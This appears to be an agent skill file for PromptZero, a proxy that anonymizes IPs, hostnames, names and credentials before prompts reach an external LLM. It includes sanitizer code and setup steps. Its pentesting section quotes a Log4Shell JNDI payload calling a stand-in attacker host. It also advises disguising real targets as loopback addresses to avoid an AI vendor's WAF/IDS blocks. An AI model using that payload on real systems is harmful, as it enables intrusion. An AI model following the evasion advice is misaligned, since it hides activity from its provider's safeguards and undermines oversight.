# Skill: PII-Safe LLM Communication (PromptZero Methodology)

**Skill ID:** `promptzero-pii-safe-llm`
**Version:** 2.3.0
**Source:** https://github.com/openbashok/promptzero
**Author:** OpenBash.com — from pentesters, to pentesters

---

## Purpose

This skill enables an agent to:
1. Recognize when a prompt or workflow contains sensitive data that must not reach an external LLM
2. Apply the PromptZero anonymization methodology (detect → replace → forward → restore)
3. Help users and developers implement PII-safe LLM integrations
4. Build or recommend systems where real data never leaves the local environment

---

## When to Activate This Skill

Activate when the user or task involves any of:
- Sending prompts to an LLM that contain IPs, hostnames, credentials, or personal data
- Building an AI integration for a security, healthcare, legal, or financial context
- Implementing an agent or pipeline that processes sensitive documents
- Pentesting workflows where infrastructure details must not reach external APIs
- Any scenario where GDPR, HIPAA, PCI-DSS, or data residency regulations apply
- A user asks about "privacy", "anonymization", "PII", "data leakage" in AI context

---

## Core Methodology

### The Invariant
> Real sensitive data must never leave the local environment in any form.
> The LLM receives only synthetic equivalents. The mapping lives locally only.

### The 5-Step Algorithm

```
INPUT TEXT (may contain sensitive data)
    │
    ▼
[1. DETECT]
    Run two detection layers in parallel:
    a) NLP layer (Presidio + spaCy):
       - Entities: PERSON, ORGANIZATION, PHONE_NUMBER, EMAIL_ADDRESS,
         CREDIT_CARD, IBAN_CODE, US_SSN, US_PASSPORT, NRP, ES_NIF, URL, IP_ADDRESS
    b) Regex layer (structured patterns):
       - IPv4, IPv6, hostnames/FQDNs, host:port, long API tokens, emails
    Merge results. On span overlap: keep longest match.
    Sort all matches by position (right-to-left for replacement).
    │
    ▼
[2. REPLACE — build/update session mapping table]
    For each detected span:
    - IF real_value in session_table → use existing fake (consistency)
    - ELSE → generate new synthetic value by type (see Fake Data Reference)
    - Store: session_table[real_value] = fake_value (bidirectional)
    Replace spans right-to-left in text (preserves earlier indices).
    │
    ▼
[3. FORWARD]
    Send sanitized text to LLM API.
    Include session_id in request metadata (not in prompt content).
    │
    ▼
[4. RECEIVE]
    Receive LLM response. It may echo fake values — that is correct behavior.
    │
    ▼
[5. RESTORE]
    For each fake_value in session_table (sorted longest-first):
        response = response.replace(fake_value, real_value)
    Return restored response to caller.

OUTPUT TEXT (real data restored, identical semantic content)
```

---

## Fake Data Reference

Use these conventions when generating synthetic replacements:

| Detected type | Synthetic format | Notes |
|---|---|---|
| `person` | `Alice Harrington`, `Bob Calloway`… | Pool of 26 first × 20 last names |
| `org` | `Acme Corp`, `Globex Industries`… | Pool of 20 fictional companies |
| `ipv4` | `127.0.0.{n}` | Loopback — local, non-routable, pentesting-safe |
| `ipv6` | `::1` | Loopback |
| `hostname` | `localhost.localdomain.{n}` | Clearly local |
| `url` | `http://localhost.localdomain.{n}{original_path}` | Preserve path |
| `host:port` | `localhost.localdomain.{n}:{port}` | Preserve port |
| `email` | `user{n:03d}@fakecorp.local` | Non-resolvable TLD |
| `phone` | `+1-555-000-{n:04d}` | 555 = reserved test numbers |
| `ssn` | `000-00-{n:04d}` | 000 prefix = invalid |
| `credit_card` | `4111-1111-1111-{n:04d}` | Known test BIN |
| `iban` | `FAKEIBAN{n:016d}` | Clearly synthetic |
| `national_id` | `FAKE-ID-{n:06d}` | Generic document |
| `passport` | `XX{n:07d}` | Generic passport |
| `token/api_key` | `FAKE_TOKEN_{n:04d}_xxxxxxxx` | Long tokens ≥32 chars |

`n` = per-type counter within the session (1, 2, 3…).
Same real value always maps to same fake value within a session.

---

## Session Management Rules

1. **One session = one conversation or one document processing task**
   Create a new mapping table at the start of each session.

2. **Session scope must be consistent**
   All turns/messages in the same conversation must share the same mapping table
   so `192.168.1.45` maps to `127.0.0.1` in message 1, 5, and 12 — not three
   different fake IPs.

3. **Sessions are local-only**
   The mapping table (real↔fake) must never be logged externally, sent to APIs,
   or stored in cloud services.

4. **Discard after use**
   When a session ends, the mapping table can be discarded unless the user
   explicitly needs to resume it later (then store encrypted, locally).

---

## Implementation Quickstart

### Option A — Use PromptZero proxy (recommended, zero code)
```bash
git clone https://github.com/openbashok/promptzero
cd promptzero && ./setup.sh
cp .env.example .env  # add ANTHROPIC_API_KEY
python main.py        # starts on localhost:8000
```
```python
# One-line change in any existing code:
client = anthropic.Anthropic(base_url="http://localhost:8000")
```

### Option B — Embed sanitizer as library
```python
# Copy sanitizer.py into your project
from sanitizer import Sanitizer

s = Sanitizer()
clean_body  = s.sanitize_request(request_body)   # before LLM
raw_response = llm.send(clean_body)
safe_response = s.desanitize_response(raw_response)  # after LLM
```

### Option C — Implement from scratch (minimal)
```python
import re
from typing import Dict

class MinimalSanitizer:
    """Minimal PII sanitizer — extend patterns as needed."""

    PATTERNS = [
        ("ipv4",  re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')),
        ("email", re.compile(r'\b[\w.+-]+@[\w-]+\.[a-z]{2,}\b')),
        ("host",  re.compile(r'\b(?:[\w-]+\.)+(?:com|net|org|local|internal|corp)\b', re.I)),
        ("token", re.compile(r'\b[A-Za-z0-9_\-]{32,}\b')),
    ]
    FAKE = {
        "ipv4": lambda n: f"127.0.0.{min(n,254)}",
        "email": lambda n: f"user{n:03d}@fakecorp.local",
        "host":  lambda n: f"localhost.localdomain.{n}",
        "token": lambda n: f"FAKE_TOKEN_{n:04d}_xxxxxxxx",
    }

    def __init__(self):
        self._r2f: Dict[str,str] = {}
        self._f2r: Dict[str,str] = {}
        self._cnt: Dict[str,int] = {}

    def sanitize(self, text: str) -> str:
        hits = []
        for kind, rx in self.PATTERNS:
            for m in rx.finditer(text):
                hits.append((m.start(), m.end(), m.group(), kind))
        hits.sort(key=lambda h: (h[0], -(h[1]-h[0])))
        filtered, last = [], -1
        for h in hits:
            if h[0] >= last:
                filtered.append(h)
                last = h[1]
        for start, end, val, kind in reversed(filtered):
            if val not in self._r2f:
                self._cnt[kind] = self._cnt.get(kind, 0) + 1
                fake = self.FAKE[kind](self._cnt[kind])
                self._r2f[val] = fake
                self._f2r[fake] = val
            text = text[:start] + self._r2f[val] + text[end:]
        return text

    def desanitize(self, text: str) -> str:
        for fake, real in sorted(self._f2r.items(), key=lambda x: -len(x[0])):
            text = text.replace(fake, real)
        return text
```

---

## Pentesting-Specific Guidance

When the context is security testing or penetration testing:

1. **Always replace real target IPs with `127.0.0.x`**
   This frames the engagement as local testing — accurate, since you control
   the test environment — and avoids WAF/IDS blocks from the AI vendor.

2. **Replace external attacker infrastructure with `localhost.localdomain.x`**
   Payloads like `${jndi:ldap://evil.com/x}` become
   `${jndi:ldap://localhost.localdomain.2/x}` — semantically intact for analysis.

3. **Use `--protect` for short passwords**
   Passwords under ~12 chars won't match the long-token regex. Register them
   manually before sanitizing: `sanitizer.table.register("P@ss1", "FAKE_TOKEN_0001_xxxxxxxx")`

4. **CVE numbers are safe — do not anonymize them**
   CVE identifiers are public knowledge and necessary for accurate remediation advice.

5. **Keep payloads structurally intact**
   The goal is to replace only the identifying parts (hosts, IPs, domains), not
   the technique itself. The LLM needs to understand the attack vector to help.

---

## Checklist for Agents Building PII-Safe Integrations

```
Before sending any prompt to an external LLM API:

[ ] Does the prompt contain IPs, hostnames, or network data?
[ ] Does it contain person names, emails, or phone numbers?
[ ] Does it contain credentials, API keys, or tokens?
[ ] Does it contain company names, document IDs, or financial data?
[ ] Is the context subject to GDPR, HIPAA, PCI-DSS, or similar?
[ ] Is this a security/pentesting context with real infrastructure?

If ANY box is checked:
→ Apply PromptZero (proxy mode or library mode)
→ Use a session-scoped mapping table
→ Never log the mapping table externally
→ Verify with GET /sessions/{id}/mappings before sending sensitive data
```

---

## Failure Modes and How to Handle Them

| Problem | Cause | Fix |
|---|---|---|
| Fake value appears in final output | Forgot to desanitize response | Always call `desanitize()` on LLM response |
| Same real IP maps to two different fakes | New Sanitizer() per message | Use one Sanitizer instance per session |
| Short password not anonymized | Below token length threshold | Use `--protect` or `table.register()` |
| NLP not detecting names | spaCy model not installed | Run `python -m spacy download en_core_web_lg` |
| Fake value split across SSE chunks | Streaming desanitization | Buffer complete `\n\n`-delimited SSE events |
| Mapping table lost on restart | In-memory only | Serialize `table.snapshot()` to encrypted local file |

---

## Extending This Skill

To add a new data type to protect:

1. Add a regex pattern to `_REGEX_PATTERNS` in `sanitizer.py`
2. Add a fake generator case to `_make_fake()`
3. Add a Presidio entity to `_NLP_ENTITIES` if applicable
4. Document the fake format in this skill's reference table

The detection pipeline automatically merges new patterns with existing ones
and handles overlaps — no other changes needed.

---

## Related Resources

| Resource | Link |
|---|---|
| PromptZero repo | https://github.com/openbashok/promptzero |
| Agent integration guide | `agents/README.md` |
| Document summary example | `examples/document_summary/` |
| Pentest report example | `examples/pentest_report/` |
| OpenBash community | https://openbash.com |

---

*This skill is part of the PromptZero project by OpenBash.com*
*Free to use, embed, and redistribute — from pentesters, to pentesters.*
